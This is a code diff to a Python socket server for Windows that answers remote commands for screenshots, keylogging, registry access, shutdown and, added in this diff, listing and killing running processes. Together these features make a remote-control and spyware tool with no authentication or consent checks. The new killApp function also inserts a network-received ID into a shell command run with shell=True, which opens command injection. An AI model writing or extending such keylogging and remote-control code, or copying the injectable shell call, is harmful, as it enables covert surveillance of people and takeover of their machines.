@@ -5,6 +5,8 @@ import io
 import os
 import winreg
 from pynput import keyboard
+import subprocess
+import re
 
 HEADER = 64
 PORT = 5050
@@ -16,6 +18,8 @@ SCREENSHOT_MSG = "!SCREENSHOT"
 SHUTDOWN_MSG = "!SHUTDOWN"
 REGISTRY_MSG = "!REGISTRY"
 KEYLOG_MSG = "!KEYLOG"
+GETAPP_MSG = "!GETAPP"
+KILLAPP_MSG = "!KILLAPP"
 
 server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 server.bind((SERVER, PORT))
@@ -28,6 +32,14 @@ def send(connection, msg):
     msg_len += (b' '*(HEADER - len(msg_len)))
     connection.send(msg_len)
     connection.send(message)
+
+def receive(connection):
+    msg_len = connection.recv(HEADER).decode(FORMAT)
+    if msg_len:
+        msg_len = int(msg_len)
+        msg = connection.recv(msg_len).decode(FORMAT)
+        return msg
+    return ""
 
 def sendScreenShot(connection, address):
     print(f"[{address}] !SCREENSHOT")
@@ -58,6 +70,46 @@ def record_keys(connection, address):
     _keylogged = ''.join(keys_pressed)
     send(connection, _keylogged)
 
+def getAppList():
+    cmd = ['powershell', 'gps | where {$_.MainWindowTitle } | select Description,Id,Path,@{Name=\'Threads\';Expression={(Get-Process -Id $_.Id).Threads.Count}}']
+    proc = subprocess.run(cmd, stdout=subprocess.PIPE, text=True, check=True)
+    process_list = []
+    
+    for line in proc.stdout.splitlines():
+        line = line.strip()
+        if line:
+            try:
+                description, app_id, path, threads = re.split(r'\s+', line, maxsplit=3)
+                process_list.append({
+                    'description': description,
+                    'app_id': app_id,
+                    'path': path,
+                    'threads': threads
+                })
+            except Exception as e:
+                print(f"Error processing line: {line} - {e}")
+    
+    return (process_list, len(process_list))
+
+
+def killApp(app_id, connection):
+    cmd = f'powershell "Stop-Process -Id {app_id}"'
+    try:
+        subprocess.run(cmd, shell=True, check=True)
+        send(connection, f"App with ID {app_id} has been killed")
+    except:
+        send(connection, f"Error while killing app with ID {app_id}")
+
+def sendAppList(connection):
+    processes, list_len = getAppList()
+    send(connection, str(list_len))
+    for item in processes:
+        send(connection, item["description"])
+        send(connection, item["app_id"])
+        send(connection, item["path"])
+        send(connection, item["threads"])
+    print("Done sending")
+
 def handle_client(connection, address):
     print(f"New connection initialized - {address}.")
     while True:
@@ -68,6 +120,11 @@ def handle_client(connection, address):
             if msg == DISCONNECT_MSG:
                 print(f"[{address}] - Connection closed")
                 break
+            elif msg == GETAPP_MSG:
+                sendAppList(connection)
+            elif msg == KILLAPP_MSG:
+                app_id = receive(connection)
+                killApp(app_id, connection)
             elif msg == SCREENSHOT_MSG:
                 sendScreenShot(connection, address)
             elif msg == SHUTDOWN_MSG:
